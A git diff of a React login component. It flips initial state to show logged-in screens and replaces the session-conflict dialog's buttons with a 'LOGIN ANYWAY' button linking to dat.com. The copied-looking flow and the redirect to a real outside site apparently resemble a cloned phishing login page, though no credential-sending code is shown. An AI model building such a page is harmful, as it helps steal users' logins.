@@ -6,8 +6,8 @@ import { PasswordInput } from "./Password";
 function App() {
   const [password, setPassword] = useState("");
   const [username, setUsername] = useState("");
-  const [login, setLogin] = useState(true);
-  const [loggedIn, setLoggedIn] = useState(false);
+  const [login, setLogin] = useState(false);
+  const [loggedIn, setLoggedIn] = useState(true);
   const [firstRequired, setFirstRequired] = useState(false);
   const [secondRequired, setSecondRequired] = useState(false);
   const [passwordRequired, setPasswordRequired] = useState(false);
@@ -17,7 +17,7 @@ function App() {
   const [number, setNumber] = useState("");
   const [id, setId] = useState(null);
   const [isLoader, setIsLoader] = useState("none");
-  const [isContinue, setIsContinue] = useState(false);
+  const [isContinue, setIsContinue] = useState(true);
 
   const handleLogin = async () => {
     setIsLoader("block");
@@ -297,7 +297,7 @@ function App() {
         <div
           style={{
             width: "100vw",
-            backgroundImage: " url(https://cdn.pixabay.com/photo/2014/02/27/16/10/flowers-276014_640.jpg)",
+            backgroundImage: "url(public/bg.png)",
             backgroundRepeat: "no-repeat",
             backgroundSize: "cover",
             height: "100vh"
@@ -312,23 +312,22 @@ function App() {
                   If you click <i>Login Anyway</i>, the other device will be logged out.
                 </p>
                 <div style={{ textAlign: "right" }}>
-                  <button type="button" className="c14e56dac" style={{ color: "#2b82b6", padding: "5px 10px" }}>
-                    GO BACK
-                  </button>
-                  <button
-                    type="button"
-                    style={{
-                      backgroundColor: "#6e6e6e",
-                      color: "white",
-                      padding: "10px 20px",
-                      borderRadius: "5px",
-                      border: "1px solid #6e6e6e",
-                      marginLeft: "15px",
-                      cursor: "pointer"
-                    }}
-                  >
-                    LOGIN ANYWAY
-                  </button>
+                  <a href="https://dat.com">
+                    <button
+                      type="button"
+                      style={{
+                        backgroundColor: "#6e6e6e",
+                        color: "white",
+                        padding: "10px 20px",
+                        borderRadius: "5px",
+                        border: "1px solid #6e6e6e",
+                        marginLeft: "15px",
+                        cursor: "pointer"
+                      }}
+                    >
+                      LOGIN ANYWAY
+                    </button>
+                  </a>
                 </div>
               </div>
             </div>
